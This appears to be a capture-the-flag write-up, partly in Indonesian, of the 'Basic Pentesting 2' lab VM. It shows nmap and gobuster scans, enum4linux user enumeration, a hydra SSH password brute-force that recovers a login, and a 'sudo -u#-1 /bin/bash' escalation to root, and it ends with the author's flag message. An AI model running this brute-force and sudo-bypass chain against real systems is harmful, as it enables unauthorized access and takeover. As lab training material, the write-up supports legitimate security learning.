TARGET  PENTESTING 2

IP 192.168.1.10

scan with NMAP

nmap -sV -sC 192.168.1.12 -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 01:44 EDT
Nmap scan report for 192.168.1.12
Host is up (0.030s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-09-04T05:45:27
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-09-04T01:45:27-04:00



kita lakukan pencarian dirbuster terlebih dahulu

gobuster dir -u http://192.168.1.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.12/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/09/04 01:48:09 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 158]
/development          (Status: 301) [Size: 318] [--> http://192.168.1.12/development/]
Progress: 69816 / 882244 (7.91%)                                                     ^C
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2022/09/04 01:49:10 Finished
===============================================================


di sini kita mendapatkan 2 secret dir untuk kita cek dan ekseskusi
setelah mendapat next movement  lanjut tools enum4linux

enum4linux 192.168.1.12

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

terdapat 2 user dalam box tersebut dan di petunjuk awal  user tersebut memiliki password yang vuln dan langsung eksekusi dengan hydra 

 hydra -u jan -P /usr/share/wordlists/rockyou.txt ssh 192.168.1.12
 
 
 dan kita dapat 1 user 
 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-04 02:03:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.12:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344245 to do in 1532:31h, 14 active
[STATUS] 117.33 tries/min, 352 tries in 00:03h, 14344049 to do in 2037:31h, 14 active
[STATUS] 102.29 tries/min, 716 tries in 00:07h, 14343685 to do in 2337:12h, 14 active
[22][ssh] host: 192.168.1.12   login: jan   password: armando


lanjutk kita  login dengan ssh jan@192.168.1.12

ini untuk membuat kita  menjadi root dan mendapatkan hak istimewa

su kay
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

sudo -u#-1 /bin/bash

root@basic2:~# whoami
root
root@basic2:~# cd /root/
root@basic2:/root# ls
flag.txt
root@basic2:/root# cat flag.txt 
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!

"enum4linux adalah tools untuk melakukan  serangan pada port SMB (Port 139)



DONE !!!!





